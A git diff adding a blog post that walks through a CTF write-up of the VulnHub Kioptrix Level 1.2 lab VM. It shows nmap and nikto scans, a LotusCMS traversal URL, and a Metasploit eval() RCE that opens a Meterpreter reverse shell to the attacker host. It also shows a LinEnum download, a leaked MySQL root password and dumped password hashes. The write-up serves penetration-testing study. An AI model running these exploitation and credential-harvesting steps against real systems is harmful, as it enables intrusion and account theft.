@@ -9,13 +9,13 @@
 
   
 
-  <title>Kioptrix Level 1 Writeup</title>
+  <title>Kioptrix Level 1.2 (#3) Writeup</title>
 
   
   <meta name="author" content="Asher Andree">
   
 
-  <meta name="description" content="">
+  <meta name="description" content="Kioptrix Level 1.2 continues the Kioptrix VulnHub series, and provides great experience creativily reusing credentials, attacking common web applications, and cracking hashed passwords. We start by exploiting LotusCMS to get a shell as www-data. From there, we find MySQL credentials that we use to login to phpMyAdmin and dump hashed...">
 
   
 
@@ -72,8 +72,8 @@
 
   
   <meta property="og:site_name" content="0xAsh">
-  <meta property="og:title" content="Kioptrix Level 1 Writeup">
-  <meta property="og:description" content="">
+  <meta property="og:title" content="Kioptrix Level 1.2 (#3) Writeup">
+  <meta property="og:description" content="Kioptrix Level 1.2 continues the Kioptrix VulnHub series, and provides great experience creativily reusing credentials, attacking common web applications, and cracking hashed passwords. We start by exploiting LotusCMS to get a shell as www-data. From there, we find MySQL credentials that we use to login to phpMyAdmin and dump hashed...">
 
   
   <meta property="og:image" content="http://localhost:4000/assets/img/logo_htb.png">
@@ -93,8 +93,8 @@
   <meta name="twitter:site" content="@0xashhh">
   <meta name="twitter:creator" content="@0xashhh">
 
-  <meta property="twitter:title" content="Kioptrix Level 1 Writeup">
-  <meta property="twitter:description" content="">
+  <meta property="twitter:title" content="Kioptrix Level 1.2 (#3) Writeup">
+  <meta property="twitter:description" content="Kioptrix Level 1.2 continues the Kioptrix VulnHub series, and provides great experience creativily reusing credentials, attacking common web applications, and cracking hashed passwords. We start by exploiting LotusCMS to get a shell as www-data. From there, we find MySQL credentials that we use to login to phpMyAdmin and dump hashed...">
 
   
   <meta name="twitter:image" content="http://localhost:4000/assets/img/logo_htb.png">
@@ -156,7 +156,7 @@
     <div class="row">
       <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
         <div class="post-heading">
-          <h1>Kioptrix Level 1 Writeup</h1>
+          <h1>Kioptrix Level 1.2 (#3) Writeup</h1>
           
 
           
@@ -184,7 +184,566 @@
       
 
       <article role="main" class="blog-post">
-        
+        <p>Kioptrix Level 1.2 continues the Kioptrix VulnHub series, and provides great experience creativily reusing credentials, attacking common web applications, and cracking hashed passwords.</p>
+
+<p>We start by exploiting <code class="language-plaintext highlighter-rouge">LotusCMS</code> to get a shell as www-data. From there, we find MySQL credentials that we use to login to <code class="language-plaintext highlighter-rouge">phpMyAdmin</code> and dump hashed user passwords.</p>
+
+<p>Finally, after cracking and logging in using these credentials, we exploit a sudo misconfiguration that allows us to privilege escalate using the <code class="language-plaintext highlighter-rouge">ht</code> text editor.</p>
+
+<h1 id="enumeration">Enumeration</h1>
+
+<p>Some of the intro documentation mentions that it’s useful to add the box to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, so let’s go ahead and do that:</p>
+
+<p>We’ll open up the <code class="language-plaintext highlighter-rouge">hosts</code> file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>vim /etc/hosts
+</code></pre></div></div>
+
+<p>And then simply add:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.0.0.204      kio3
+</code></pre></div></div>
+
+<p>Let’s proceed as usual now.</p>
+
+<h3 id="nmap-scans">NMAP Scans</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-sSV</span> <span class="nt">-A</span> <span class="nt">-oN</span> Kioptrix1.2 kio3
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-07-28 22:56 EDT
+Nmap scan report <span class="k">for </span>kio3 <span class="o">(</span>10.0.0.204<span class="o">)</span>
+Host is up <span class="o">(</span>0.00011s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 <span class="o">(</span>DSA<span class="o">)</span>
+|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd <span class="o">(</span>RSA<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.2.8 <span class="o">((</span>Ubuntu<span class="o">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch<span class="o">)</span>
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not <span class="nb">set</span>
+|_http-server-header: Apache/2.2.8 <span class="o">(</span>Ubuntu<span class="o">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+|_http-title: Ligoat Security - Got Goat? Security ...
+MAC Address: 08:00:27:AA:71:E0 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+Device <span class="nb">type</span>: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Network Distance: 1 hop
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>So we’ve got port 22 and 80. Looks like this will be heavily web-app based. Cool. Let’s get going.</p>
+
+<p>I’ll start by running Nikto on the host:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nikto <span class="nt">-host</span> kio3 <span class="o">&gt;&gt;</span> nikto.txt
+</code></pre></div></div>
+
+<p>While this runs in the background, let’s take a look at the webpage using Firefox:</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.2_1.PNG" alt="Viewing the webpage" /></p>
+
+<p>I’ll click around the website and see what we can find, we can start by taking a look at the <code class="language-plaintext highlighter-rouge">blog</code> page.</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.2_2.PNG" alt="Viewing the Blog" /></p>
+
+<p>Not much here, but I did notice a call out to a user known as <code class="language-plaintext highlighter-rouge">loneferret</code>, let’s note this as it could be a valid username for later.</p>
+
+<p>Anyways, let’s continue by looking at <code class="language-plaintext highlighter-rouge">/gallery</code> which is menitoned in a couple places.</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.2_3.PNG" alt="Viewing the Blog" /></p>
+
+<p>For the most part, this whole thing looks severely broken. Maybe looking at the source HTML will give us some clues:</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.2_4.PNG" alt="Viewing the Blog source" /></p>
+
+<p>Okay, one thing that immediately sticks out is the HTML comment containing:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;!-- &lt;a href="gadmin"&gt;Admin&lt;/a&gt;&amp;nbsp;&amp;nbsp; --&gt;</code></p>
+
+<p>If you know HTML, you know that the <code class="language-plaintext highlighter-rouge">href</code> value will pull in another resource, whether from an external source or a locally hosted resource… is <code class="language-plaintext highlighter-rouge">gadmin</code> a resource on the web server?</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.2_5.PNG" alt="Trying to access `gadmin`" /></p>
+
+<p>Sure is! Cool. Let’s note that, and look at the remaining pieces of baseline enumeration. Last thing on my list is the <code class="language-plaintext highlighter-rouge">login</code> button on the orignal homepage, let’s take a look at what this redirects to:</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.2_6.PNG" alt="Taking a look at the login page" /></p>
+
+<p>Cool, so it’s a login form to some admin panel… Looks like it’s related to <code class="language-plaintext highlighter-rouge">LotusCMS</code>, let’s note that down.</p>
+
+<p>At this point, Nikto has finished executing, producing the following resutls:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Nikto v2.1.6
+<span class="nt">---------------------------------------------------------------------------</span>
++ Target IP:          10.0.0.204
++ Target Hostname:    kio3
++ Target Port:        80
++ Start Time:         2020-07-28 22:58:59 <span class="o">(</span>GMT-4<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ Server: Apache/2.2.8 <span class="o">(</span>Ubuntu<span class="o">)</span> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
++ Cookie PHPSESSID created without the httponly flag
++ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
++ No CGI Directories found <span class="o">(</span>use <span class="s1">'-C all'</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
++ Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 15:22:00 2009
++ Apache/2.2.8 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span><span class="nb">.</span> Apache 2.2.34 is the EOL <span class="k">for </span>the 2.x branch.
++ PHP/5.2.4-2ubuntu5.6 appears to be outdated <span class="o">(</span>current is at least 7.2.12<span class="o">)</span><span class="nb">.</span> PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release <span class="k">for </span>each branch.
++ Web Server returns a valid response with junk HTTP methods, this may cause <span class="nb">false </span>positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ OSVDB-12184: /?<span class="o">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?<span class="o">=</span>PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?<span class="o">=</span>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?<span class="o">=</span>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is <span class="k">for </span>managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is <span class="k">for </span>managing MySQL databases, and should be protected or limited to authorized hosts.
++ 7680 requests: 0 error<span class="o">(</span>s<span class="o">)</span> and 19 item<span class="o">(</span>s<span class="o">)</span> reported on remote host
++ End Time:           2020-07-28 22:59:13 <span class="o">(</span>GMT-4<span class="o">)</span> <span class="o">(</span>14 seconds<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ 1 host<span class="o">(</span>s<span class="o">)</span> tested
+</code></pre></div></div>
+
+<p>Let’s quickly take a look at those PHP file discosures:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/?<span class="o">=</span>PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+/?<span class="o">=</span>PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+/?<span class="o">=</span>PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+/?<span class="o">=</span>PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+</code></pre></div></div>
+
+<p>I was too lazy to take screenshots of each, but all you need to know is that each of these reveals some PHP pics and credits, but nothing crazy. We now know that PHP is running, but we could infer that anyway from the <code class="language-plaintext highlighter-rouge">PHP/5.2.4-2ubuntu5.6</code> header.</p>
+
+<p>Okay, next up is that <code class="language-plaintext highlighter-rouge">/phpmyadmin/</code> finding, let’s take a look:</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.2_7.PNG" alt="/phpmyadmin/" /></p>
+
+<p>Another login page…</p>
+
+<p>Also, if we browse <code class="language-plaintext highlighter-rouge">/phpmyadmin/changelog.php</code> we can see that the most recent changelog entry is: <code class="language-plaintext highlighter-rouge">2.11.3.0 (2007-12-08)</code>… Intersting.</p>
+
+<h1 id="exploitation">Exploitation</h1>
+
+<p>Okay, so at this point we have a couple curious things to continue to check out:</p>
+<ul>
+  <li>The login page at <code class="language-plaintext highlighter-rouge">index.php?system=Admin</code> with the <code class="language-plaintext highlighter-rouge">LotusCMS</code> application.</li>
+  <li>The login page at <code class="language-plaintext highlighter-rouge">/gallery/gadmin</code></li>
+  <li>The <code class="language-plaintext highlighter-rouge">/phpmyadmin/</code> login page and PHP version</li>
+</ul>
+
+<p>Let’s start from the top. I tried some common creds on the <code class="language-plaintext highlighter-rouge">LotusCMS</code> page, but no success… Let’s do some research to see if there are exploits tied to LotusCMS.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~/VulnHub/Kioptrix1.2:<span class="nv">$ </span>searchsploit lotusCMS
+<span class="nt">-------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
+ Exploit Title                                                           |  Path                                  
+                                                                         | <span class="o">(</span>/usr/share/exploitdb/<span class="o">)</span>                
+<span class="nt">-------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
+LotusCMS 3.0 - <span class="s1">'eval()'</span> Remote Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>            | exploits/php/remote/18565.rb
+LotusCMS 3.0.3 - Multiple Vulnerabilities                                | exploits/php/webapps/16982.txt
+<span class="nt">-------------------------------------------------------------------------</span> <span class="nt">----------------------------------------</span>
+Shellcodes: No Result                                                                                             
+</code></pre></div></div>
+
+<p>Oh wow, maybe one of these works… Let’s take a look at the second item on the list:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /usr/share/exploitdb/exploits/php/webapps/16982.txt
+</code></pre></div></div>
+
+<p>I went ahead and followed the link to <a href="https://www.immuniweb.com/advisory/HTB22883">this disclosure</a>. There’s quite a bit here, most of which requires authentication, but let’s focus on the last item:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>3<span class="o">)</span> Directory traversal vulnerability <span class="k">in </span>LotusCMS
+The vulnerability exists due to insufficient validation of input data <span class="k">in </span>the <span class="s2">"page"</span> parameter <span class="k">in </span>core/model/PageModel.php. A remote attacker can create a specially crafted HTTP request containing directory traversal sequences with NULL byte and <span class="nb">read </span>arbitrary files on the target system.
+Exploitation example:
+http://host/index.php?page<span class="o">=</span>./../../../../../etc/passwd%00
+</code></pre></div></div>
+
+<p>Hmm! Let’s give it a shot.</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.2_8.PNG" alt="Trying to get an LFI" /></p>
+
+<p>No luck.. There’s also that first result which is a MetaSploit module. Let’s fire up <code class="language-plaintext highlighter-rouge">msfconsole</code> real quick and try it out.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 <span class="o">&gt;</span> use exploit/multi/http/lcms_php_exec 
+msf5 exploit<span class="o">(</span>multi/http/lcms_php_exec<span class="o">)</span> <span class="o">&gt;</span> info
+
+       Name: LotusCMS 3.0 <span class="nb">eval</span><span class="o">()</span> Remote Command Execution
+     Module: exploit/multi/http/lcms_php_exec
+   Platform: PHP
+       Arch: php
+ Privileged: No
+    License: Metasploit Framework License <span class="o">(</span>BSD<span class="o">)</span>
+       Rank: Excellent
+  Disclosed: 2011-03-03
+
+Provided by:
+  dflah_ &lt;dflah_@alligatorteam.org&gt;
+  sherl0ck_ &lt;sherl0ck_@alligatorteam.org&gt;
+  sinn3r &lt;sinn3r@metasploit.com&gt;
+
+Available targets:
+  Id  Name
+  <span class="nt">--</span>  <span class="nt">----</span>
+  0   Automatic LotusCMS 3.0
+
+Check supported:
+  Yes
+
+Basic options:
+  Name     Current Setting  Required  Description
+  <span class="nt">----</span>     <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+  Proxies                   no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
+  RHOSTS                    <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
+  RPORT    80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+  SSL      <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
+  URI      /lcms/           <span class="nb">yes       </span>URI
+  VHOST                     no        HTTP server virtual host
+
+Payload information:
+  Space: 4000
+  Avoid: 1 characters
+
+Description:
+  This module exploits a vulnerability found <span class="k">in </span>Lotus CMS 3.0<span class="s1">'s 
+  Router() function. This is done by embedding PHP code in the '</span>page<span class="s1">' 
+  parameter, which will be passed to a eval call, therefore allowing 
+  remote code execution. The module can either automatically pick up a 
+  '</span>page<span class="s1">' parameter from the default page, or manually specify one in 
+  the URI option. To use the automatic method, please supply the URI 
+  with just a directory path, for example: "/lcms/". To manually 
+  configure one, you may do: "/lcms/somepath/index.php?page=index"
+
+References:
+  https://cvedetails.com/cve/CVE-2011-0518/
+  OSVDB (75095)
+  http://secunia.com/secunia_research/2011-21/
+
+msf5 exploit(multi/http/lcms_php_exec) &gt; set URI /index.php
+URI =&gt; /index.php
+msf5 exploit(multi/http/lcms_php_exec) &gt; set RHOSTS 10.0.0.204
+RHOSTS =&gt; 10.0.0.204
+msf5 exploit(multi/http/lcms_php_exec) &gt; run
+
+[*] Started reverse TCP handler on 10.0.0.168:4444 
+[*] Using found page param: /index.php?page=index
+[*] Sending exploit ...
+[*] Sending stage (38288 bytes) to 10.0.0.204
+[*] Meterpreter session 1 opened (10.0.0.168:4444 -&gt; 10.0.0.204:46096) at 2020-07-28 23:31:50 -0400
+
+meterpreter &gt; getuid
+Server username: www-data (33)
+meterpreter &gt; 
+</span></code></pre></div></div>
+
+<p>We got a shell… idk though… I hate using MetaSploit sometimes. Let’s see if we can be elitist and find a manual exploit for this vuln, after all it’s from <code class="language-plaintext highlighter-rouge">2011</code>. There’s bound to be one.</p>
+
+<p><code class="language-plaintext highlighter-rouge">~~~Googling~~~</code></p>
+
+<p>Okay, 30 seconds later, and we found <a href="https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/master/lotusRCE.sh">this</a></p>
+
+<p>Cool, let’s try running it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ein@~/VulnHub/Kioptrix1.2:<span class="nv">$ </span>./lotusRCE.sh 10.0.0.204 /index.php
+</code></pre></div></div>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.2_9.PNG" alt="Anti-script kiddie" /></p>
+
+<p>And we got a shell as <code class="language-plaintext highlighter-rouge">www-data</code>.</p>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+
+<p>There <em>are</em> the two other web login panels that we didn’t check out. These might be entry points, but let’s continue with our shell and see if there’s a path forward to root.</p>
+
+<p>Let’s get started by upgrading our shell to a full tty using Python:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>which python
+/usr/bin/python
+python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash');"</span>
+www-data@Kioptrix3:/home/www/kioptrix3.com<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Cool! We’ll go ahead and repeat the process from the <a href="https://0xash.github.io/2020-07-28-Kioptrix-Level-1.1/">last box</a> and run LinEnum:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Kioptrix3:/<span class="nv">$ </span>which wget
+which wget
+/usr/bin/wget
+www-data@Kioptrix3:/<span class="nv">$ </span><span class="nb">cd</span> /tmp
+<span class="nb">cd</span> /tmp
+www-data@Kioptrix3:/tmp<span class="nv">$ </span><span class="nb">mkdir </span>lol
+<span class="nb">mkdir </span>lol
+www-data@Kioptrix3:/tmp<span class="nv">$ </span><span class="nb">cd </span>lol
+<span class="nb">cd </span>lol
+www-data@Kioptrix3:/tmp/lol<span class="nv">$ </span>wget http://10.0.0.168/LinEnum.sh
+wget http://10.0.0.168/LinEnum.sh
+<span class="nt">--23</span>:41:18--  http://10.0.0.168/LinEnum.sh
+           <span class="o">=&gt;</span> <span class="sb">`</span>LinEnum.sh<span class="s1">'
+Connecting to 10.0.0.168:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 46,631 (46K) [text/x-sh]
+
+ 0% [                                     ] 0             --.--K/s         100%[====================================&gt;] 46,631        --.--K/s             
+
+23:41:18 (336.00 MB/s) - `LinEnum.sh'</span> saved <span class="o">[</span>46631/46631]
+
+www-data@Kioptrix3:/tmp/lol<span class="nv">$ </span><span class="nb">chmod</span> +x LinEnum.sh <span class="o">&amp;&amp;</span> ./LinEnum.sh <span class="o">&gt;&gt;</span> lol.txt
+<span class="nb">chmod</span> +x LinEnum.sh <span class="o">&amp;&amp;</span> ./LinEnum.sh <span class="o">&gt;&gt;</span> lol.txt
+www-data@Kioptrix3:/tmp/lol<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 84
+drwxr-xr-x 2 www-data www-data  4096 Jul 28 23:41 <span class="nb">.</span>
+drwxrwxrwt 5 root     root      4096 Jul 28 23:41 ..
+<span class="nt">-rwxr-xr-x</span> 1 www-data www-data 46631 Jul 28 23:40 LinEnum.sh
+<span class="nt">-rw-r--r--</span> 1 www-data www-data 28137 Jul 28 23:41 lol.txt
+www-data@Kioptrix3:/tmp/lol<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>I’ll save you from the FTP commands getting the output file back to my host, anyways, let’s take a look at the interesting findings:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Linux Kioptrix3 2.6.24-24-server
+</code></pre></div></div>
+
+<p>This is really old… if we look at the rest of the output we can see some information on users that have logged onto the system:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Users that have previously logged onto the system:
+Username         Port     From             Latest
+root             tty1                      Mon Apr 18 11:29:13 <span class="nt">-0400</span> 2011
+loneferret       pts/1    192.168.1.106    Sat Apr 16 08:51:58 <span class="nt">-0400</span> 2011
+</code></pre></div></div>
+
+<p>This confirms our assumption from the beginning that <code class="language-plaintext highlighter-rouge">loneferret</code> was a valid user on the box. Cool.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN      -               
+tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      4284/sh         
+tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -               
+</code></pre></div></div>
+
+<p>Looks like MySQL is listening locally, might want to check this out later.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Useful file locations:
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+</code></pre></div></div>
+
+<p>Cool, we have <code class="language-plaintext highlighter-rouge">gcc</code> if we need to compile stuff. Let’s continue by checking off items from this list… Starting with the kernel verison:</p>
+
+<p><code class="language-plaintext highlighter-rouge">~~~Googling~~~</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">~~~Trying Exploits~~~</code></p>
+
+<p>I tried quite a few exploits, and ultimately decided to go down other avenues. I was running into dead ends, so decided to think from the beginning again…</p>
+
+<p>Let’s see, where did we get dropped upon getting a shell?</p>
+
+<p><code class="language-plaintext highlighter-rouge">/home/www/kioptrix3.com</code></p>
+
+<p>Wow, did we even see if we can access other home directories?</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-la</span> /home
+total 20
+drwxr-xr-x  5 root       root       4096 Apr 16  2011 <span class="nb">.</span>
+drwxr-xr-x 21 root       root       4096 Apr 11  2011 ..
+drwxr-xr-x  2 dreg       dreg       4096 Apr 16  2011 dreg
+drwxr-xr-x  3 loneferret loneferret 4096 Apr 17  2011 loneferret
+drwxr-xr-x  3 root       root       4096 Apr 12  2011 www
+</code></pre></div></div>
+
+<p>Keep enumerating…</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-la</span> /home/loneferret
+total 64
+drwxr-xr-x 3 loneferret loneferret  4096 Apr 17  2011 <span class="nb">.</span>
+drwxr-xr-x 5 root       root        4096 Apr 16  2011 ..
+<span class="nt">-rw-r--r--</span> 1 loneferret <span class="nb">users         </span>13 Apr 18  2011 .bash_history
+<span class="nt">-rw-r--r--</span> 1 loneferret loneferret   220 Apr 11  2011 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 loneferret loneferret  2940 Apr 11  2011 .bashrc
+<span class="nt">-rw-------</span> 1 root       root          15 Apr 15  2011 .nano_history
+<span class="nt">-rw-r--r--</span> 1 loneferret loneferret   586 Apr 11  2011 .profile
+drwx------ 2 loneferret loneferret  4096 Apr 14  2011 .ssh
+<span class="nt">-rw-r--r--</span> 1 loneferret loneferret     0 Apr 11  2011 .sudo_as_admin_successful
+<span class="nt">-rw-r--r--</span> 1 root       root         224 Apr 16  2011 CompanyPolicy.README
+<span class="nt">-rwxrwxr-x</span> 1 root       root       26275 Jan 12  2011 checksec.sh
+</code></pre></div></div>
+
+<p>Hmm… Okay, let’s take a look at <code class="language-plaintext highlighter-rouge">CompanyPolicy.README</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>CompanyPolicy.README 
+Hello new employee,
+It is company policy here to use our newly installed software <span class="k">for </span>editing, creating and viewing files.
+Please use the <span class="nb">command</span> <span class="s1">'sudo ht'</span><span class="nb">.</span>
+Failure to <span class="k">do </span>so will result <span class="k">in </span>you immediate termination.
+
+DG
+CEO
+</code></pre></div></div>
+
+<p>Dang. Unfortunately we can’t sudo since we don’t know <code class="language-plaintext highlighter-rouge">www-data</code>’s password.</p>
+
+<p>I think it’s time to enumerate more.</p>
+
+<p>Let’s look through the webapp files and see if we missed anything:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Kioptrix3:/home/www/kioptrix3.com<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 92
+drwxr-xr-x  8 root root  4096 Apr 15  2011 <span class="nb">.</span>
+drwxr-xr-x  3 root root  4096 Apr 12  2011 ..
+drwxrwxrwx  2 root root  4096 Apr 15  2011 cache
+drwxrwxrwx  8 root root  4096 Apr 14  2011 core
+drwxrwxrwx  8 root root  4096 Apr 14  2011 data
+<span class="nt">-rw-r--r--</span>  1 root root 23126 Jun  5  2009 favicon.ico
+drwxr-xr-x  7 root root  4096 Apr 14  2011 gallery
+<span class="nt">-rw-r--r--</span>  1 root root 26430 Jan 21  2007 gnu-lgpl.txt
+<span class="nt">-rw-r--r--</span>  1 root root   399 Feb 23  2011 index.php
+drwxrwxrwx 10 root root  4096 Apr 14  2011 modules
+drwxrwxrwx  3 root root  4096 Apr 14  2011 style
+<span class="nt">-rw-r--r--</span>  1 root root   243 Aug  5  2010 update.php
+www-data@Kioptrix3:/home/www/kioptrix3.com<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>These are all interesting… looking through them all led me to <code class="language-plaintext highlighter-rouge">gallery/gconfig.php</code>, which contains:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">"gallarific_mysql_server"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+        <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">"gallarific_mysql_database"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"gallery"</span><span class="p">;</span>
+        <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">"gallarific_mysql_username"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">;</span>
+        <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">"gallarific_mysql_password"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"fuckeyou"</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Cool. Let’s truy logging into <code class="language-plaintext highlighter-rouge">/phpmyadmin/</code> with these.</p>
+
+<p><img src="/assets/img/VulnHub/Kioptrix1.2_10.PNG" alt="Logging into PHP admin" /></p>
+
+<p>Easy enough. After this I looked around through the SQL tables for a while, and eventually found some hashed user passwords in the <code class="language-plaintext highlighter-rouge">dev_accounts</code> table in the <code class="language-plaintext highlighter-rouge">gallery</code> database:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	Full Texts 	<span class="nb">id 	</span>username 	password
+	Edit 	Delete 	1 	dreg 		0d3eccfb887aabd50f243b3f155c0f85
+	Edit 	Delete 	2 	loneferret 	5badcaf789d3d1d09794d8f021f40f0e
+</code></pre></div></div>
+
+<p>Let’s pipe these over to <code class="language-plaintext highlighter-rouge">john</code> and try to crack them:</p>
+
